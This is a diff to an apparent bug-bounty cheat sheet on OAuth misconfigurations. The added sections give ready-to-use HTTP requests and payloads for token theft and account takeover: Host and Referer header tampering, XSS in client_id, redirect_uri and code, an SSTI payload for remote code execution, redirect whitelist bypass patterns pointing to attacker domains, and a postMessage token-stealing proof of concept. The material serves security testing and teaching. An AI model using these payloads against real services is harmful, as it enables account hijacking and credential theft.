@@ -1,4 +1,4 @@
-# OAUTH Security Testing
+# OAUTH Misconfigurations
 
 ### Brute Force to Get Legacy OR Unimplemented OAuth Flows
 
@@ -47,6 +47,171 @@ Try To Remove Your Email From Scope Parameter While Signing Up OR Signing In Wit
 
 * [https://hackerone.com/reports/101977](https://hackerone.com/reports/101977)
 * [https://hackerone.com/reports/314808](https://hackerone.com/reports/314808)
+
+### Change The Host Header
+
+```http
+GET /oauth/Connect HTTP/1.1
+Host: me.com/www.company.com
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+Origin: https://www.company.com
+```
+
+{% embed url="https://hackerone.com/reports/317476" %}
+
+### Insert Your Domain In Referer Header While
+
+```http
+GET /oauth/Connect HTTP/1.1
+Host: www.company.com
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+Referer: https://me.com/path
+Origin: https://www.company.com
+```
+
+* [https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/](https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/)
+* [https://security.lauritz-holtmann.de/advisories/tiktok-account-takeover/](https://security.lauritz-holtmann.de/advisories/tiktok-account-takeover/)
+* [https://hackerone.com/reports/202781](https://hackerone.com/reports/202781)
+
+### Insert admin@comapny.com in scope
+
+In OAuth Connect Request , Try To Insert admin@company.com as Value Of Email In Scope Parameter To Gain Extra Authorities OR Get More Functionalities
+
+```http
+POST /oauth/Connect HTTP/1.1
+Host: www.company.com
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: Number
+firstname=I&lastname=am&image=URL&anti_csrf=CSRF
+&email=admin@company.com&access_token=******
+```
+
+{% embed url="https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/" %}
+
+### IDOR in `id=`  Parameter
+
+> In OAuth Connect Request , Try To Recall Id In Scope Then Try To Change This Id To Id Of Logged In Account To Takeover This Account
+
+```http
+POST /oauth/Connect HTTP/1.1
+Host: www.company.com
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: Number
+firstname=I&lastname=am&image=URL&anti_csrf=CSRF
+&id=Id-Of-Another-Account&access_token=******
+```
+
+{% embed url="https://medium.com/@logicbomb_1/bugbounty-user-account-takeover-i-just-need-your-email-id-to-login-into-your-shopping-portal-7fd4fdd6dd56" %}
+
+### Add JSON OR XML Extension To OAuth Endpoint
+
+> In OAuth Connect Request , Try To Add JSON OR XML Extension To OAuth Endpoint e.g. oauth/connect.json , Maybe Token Expose In Response !
+
+```http
+POST /oauth/Connect.json HTTP/1.1
+Host: www.company.com
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: Number
+type=token&client_id=ID&anti-csrf=&redirect_uri=URL
+```
+
+{% embed url="https://hackerone.com/reports/850022" %}
+
+### XSS in OAUTH Connect/Callback
+
+```http
+GET /oauth/Connect?)%7D(alert)(location);%7B%3C!--&state=\&redirect_uri=URL&scope=read&type=code&client_id=ID& HTTP/1.1
+Host: www.company.com
+User-Agent: Mozilla/5.0
+Referer: https://previous.com/path
+Origin: https://www.company.com
+Accept-Encoding: gzip, deflate
+```
+
+{% embed url="https://hackerone.com/reports/311639" %}
+
+### Insert XSS Payloads To Cause Errors
+
+> Try To Insert XSS Payloads e.g. XSS To Cause Errors
+
+```http
+GET /oauth/Connect?
+ client_id=<marquee loop=1 width=0 onfinish=
+ pr\u006fmpt(document.domain)></marquee> HTTP/1.1
+Host: www.company.com
+User-Agent: Mozilla/5.0
+Referer: https://me.com/path
+Origin: https://www.company.com
+```
+
+{% embed url="https://blog.usejournal.com/reflected-xss-in-zomato-f892d6887147" %}
+
+### SSTI in Scope Parameter
+
+> In OAuth Connect Request Try To Insert SSTI Payloads In Scope Parameter e.g. ${T(java.lang.Runtime).getRuntime().exec("calc.exe")} To Get RCE
+
+```http
+GET /oauth/Connect?
+ type=code&client_id=ID&state=Random&redirect_uri=URL
+ &scope=${T(Java.lang.Runtime).getRuntime().
+ exec("calc.exe")} HTTP/1.1
+Host: www.company.com
+User-Agent: Mozilla/5.0
+Referer: https://previous.com/path
+Origin: https://www.company.com
+Accept-Encoding: gzip, deflate
+```
+
+{% embed url="https://www.gosecure.net/blog/2018/05/17/beware-of-the-magic-spell-part-2-cve-2018-1260/" %}
+
+### XSS in RedirectUri&#x20;
+
+> Try To Insert XSS Payloads As Value Of Redirect URL e.g. data:company.com;text/html;charset=UTF-8,%3Chtml%3E%3Cscript%3Edocument.write(document.domain);%3C%2Fscript%3E%3Ciframe/src= xxxxx%3Eaaaa%3C/iframe%3E%3C%2Fhtml%3E To GET DOM-Based XSS
+
+```http
+GET /oauth/Connect?type=code&client_id=ID&state=Random
+&redirect_uri=data:company.com;text/html;charset=UTF-8
+,%3Chtml%3E%3Cscript%3Edocument.write(document.
+domain);%3C%2Fscript%3E%3Ciframe/src=xxxxx%3Eaa
+aa%3C/iframe%3E%3C%2Fhtml%3E&scope=read HTTP/1.1
+Host: www.company.com
+User-Agent: Mozilla/5.0
+-----------------------------
+POST /oauth/Connect HTTP/1.1
+Host: www.company.com
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: Number
+client_id=ID&client_secret=SECRET&type=Authorization&
+code=Auth_code&redirect_uri=javascript:fetch('XSS')
+```
+
+{% embed url="http://stamone-bug-bounty.blogspot.com/2017/10/dom-xss-auth14.html" %}
+
+{% embed url="https://ysamm.com/?p=695" %}
+
+### Path Traversal to open Redirect
+
+> Try To Insert Redirect URL Parameter To Redirect URL As Value To Steal The Authorization Code OR The Access Token
+
+```http
+GET /oauth/Connect?type=code&client_id=ID&state=Random
+&redirect_uri=https://www.company.com.com/../../redirect_
+uri=https://me.com&scope=read HTTP/1.1
+Host: www.company.com
+User-Agent: Mozilla/5.0
+Referer: https://previous.com/path
+Origin: https://www.company.com
+```
+
+{% embed url="https://hackerone.com/reports/2559" %}
+
+{% embed url="https://ysamm.com/?p=697" %}
 
 ### Authentication Bypass via OAuth Implicit Flow
 
@@ -245,3 +410,166 @@ OAuth implementations can be vulnerable to various security issues. By understan
 * [Stealing Users OAuth Tokens through redirect\_uri parameter](https://hackerone.com/reports/665651)
 * [What about Refresh Token](https://medium.com/@iknowhatodo/what-about-refreshtoken-19914d3f2e46)
 * [Account Takeover Chain](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html)
+
+### List Of Patterns To Bypass The Whitelist In Redirect URL Parameter
+
+```http
+https://me.com\@www.company.com
+https://company.com\@me.com
+https://me.com/.www.company.com
+https://company.com/ @me.com
+https://me.com\[company.com]
+me.com%ff@company.com%2F
+me.com%bf:@company.com%2F
+me.com%252f@company.com%2F
+//me.com%0a%2523.company.com
+me.com://company.com
+androideeplink://me.com\@company.com
+androideeplink://a@company.com:@me.com
+androideeplink://company.com
+https://company.com.me.com\@company.com
+company.com%252f@me.com%2fpath%2f%3
+//me.com:%252525252f@company.com
+company.com.evil.com
+evil.com#company.com
+evil.com?company.com
+/%09/me.com
+me.com%09company.com
+/\me.com
+```
+
+* [https://deepsec.net/docs/Slides/2016/Go\_Hack\_Yourself...\_Frans\_Rosen.pdf](https://deepsec.net/docs/Slides/2016/Go\_Hack\_Yourself...\_Frans\_Rosen.pdf)
+* [https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Wang-Make-Redirection-Evil-Again.pdf](https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Wang-Make-Redirection-Evil-Again.pdf)
+* [https://twitter.com/kunalp94/status/1195321932612169728](https://twitter.com/kunalp94/status/1195321932612169728)
+* [https://twitter.com/kunalp94/status/1195321932612169728](https://twitter.com/kunalp94/status/1195321932612169728)
+* [https://research.nccgroup.com/2020/07/07/an-offensive-guide-to-the-authorization-code-grant/](https://research.nccgroup.com/2020/07/07/an-offensive-guide-to-the-authorization-code-grant/)
+* [https://elmahdi.tistory.com/4](https://elmahdi.tistory.com/4)
+
+### Use IDN Homograph Attack To Spoof Redirect URL Parameter
+
+> Try To Use IDN Homograph Attack To Spoof Redirect URL Parameter To Steal The Authorization Code OR The Access Token
+
+```http
+GET /oauth/Connect?type=code&client_id=ID&state=Random&redirect_uri=https://www.cṍmpany.com&scope=read HTTP/1.1
+Host: www.company.com
+User-Agent: Mozilla/5.0
+Referer: https://previous.com/path
+Origin: https://www.company.com
+```
+
+{% embed url="https://hackerone.com/reports/861940" %}
+
+### Black Characters&#x20;
+
+> Try To Insert Invisible Range %00 To %FF in The URL e.g. me.com%5bcompany.com As Value Of Redirect URL Parameter
+
+{% embed url="https://twitter.com/ElMrhassel/status/1282661956676182017" %}
+
+{% embed url="https://twitter.com/intigriti/status/1185160357872066561" %}
+
+### Change Request Method
+
+> Try To Change Request Method To e.g. GET , POST , HEAD OR PUT To Understand How Company Routes The Different Methods in OAuth Flow
+
+```http
+HEAD /oauth/Connect?
+ type=code&client_id=ID&state=Random
+ &redirect_uri=URL&scope=read HTTP/1.1
+Host: www.company.com
+User-Agent: Mozilla/5.0
+Referer: https://previous.com/path
+Origin: https://www.company.com
+Accept-Encoding: gzip, deflate
+```
+
+{% embed url="https://blog.teddykatz.com/2019/11/05/github-oauth-bypass.html" %}
+
+### Race Condition
+
+> Try To Figure Out Reaction Of The Server While Doing Race Condition By Using Turbo Intruder OR Nuclei To Send Simultaneously Requests
+
+```http
+GET /oauth/Callback?code=Valid HTTP/1.1
+Host: www.company.com
+X-Test: %s
+email=victim@gmail.com&otp=wrongOTP
+```
+
+{% embed url="https://hackerone.com/reports/55140" %}
+
+### XSS in the `code=` parameter
+
+> Try To Insert XSS Payloads e.g. ,%2520alert(123))%253B// In The Authorization Code Parameter If Value Of Code Parameter Reflected
+
+```http
+GET /oauth/Callback?code=,%2520alert(123))%253B// HTTP/1.1
+Host: www.company.com
+User-Agent: Mozilla/5.0
+Referer: https://previous.com/path
+Origin: https://www.company.com
+```
+
+{% embed url="https://hackerone.com/reports/56760" %}
+
+### Reuse The Authorization Code With XSS Payloads
+
+> If The Authorization Code Is Used More Than Once Try To Reuse The Authorization Code With XSS Payloads e.g. Codealert('XSS')
+
+```http
+POST /oauth/Callback HTTP/1.1
+Host: www.company.com
+User-Agent: Mozilla/5.0
+Content-Type: application/x-www-form-urlencoded
+Referer: https://previous.com/path
+Origin: https://www.company.com
+Content-Length: Number
+client_id=ID&client_secret=SECRET&type=Authorization&code=
+Auth_Code<script>alert('XSS')</script>&redirect_uri=URL
+```
+
+{% embed url="https://owasp.org/www-pdf-archive/20151215-Top_X_OAuth_2_Hacks-asanso.pdf" %}
+
+{% embed url="http://blog.intothesymmetry.com/2014/02/oauth-2-attacks-and-bug-bounties.html" %}
+
+### Use The OAuth Token With Logged In User In OAuth Provider
+
+> \*\*\* If App Ask You Log In With OAuth Provider By Generating OAuth Token , Try To Use The OAuth Token With Logged In User In OAuth Provider
+
+```http
+1 - I am logged in with app.com as Account One
+2 - I open appservice.com
+3 - I get https://api.app.com/oauth/?oauth_token=*****
+4 - I did not move forward and shared this link with someone who
+is logged in with app.com as Account Two
+5 - Account Two grants the permission to the third Party App appservice.com
+6 - Account One also grants the permission to the third Party App
+appservice.com By Using The Same OAuth Token
+7 - I Get Dashboard Of appservice.com of Account Two Not Account One
+```
+
+{% embed url="https://hackerone.com/reports/46485" %}
+
+{% embed url="https://infosecwriteups.com/oauth-misconfiguration-leads-to-full-account-takeover-22b032cb6732?source=---------1----------------------------" %}
+
+### Exploit Post Messages
+
+> Try To Use Whitelist Subdomain With Endpoint Contains postMessage(Msg,"\*"); In which Msg = window.location.href.split("#")\[1]; To Steal The Access Token
+
+```http
+1 - search About :-
+var Msg = window.location.href.split("#")[1];
+window.parent.postMessage(Msg,"*");
+2 - There Isn't :-
+X-Frame-Options Header
+3 - Use This POC :-
+var exploit_url = 'https://company.com/oauth?client_id=id&redirect_uri=
+https://sub.company.com/postMsg.js';
+var i = document.createElement('iframe');
+document.body.appendChild(i);
+window.addEventListener('oauth', function(Token) {alert(Token.data.name);
+}, !1);
+```
+
+{% embed url="https://www.amolbaikar.com/facebook-oauth-framework-vulnerability/" %}
+
+{% embed url="https://hackerone.com/reports/821896" %}
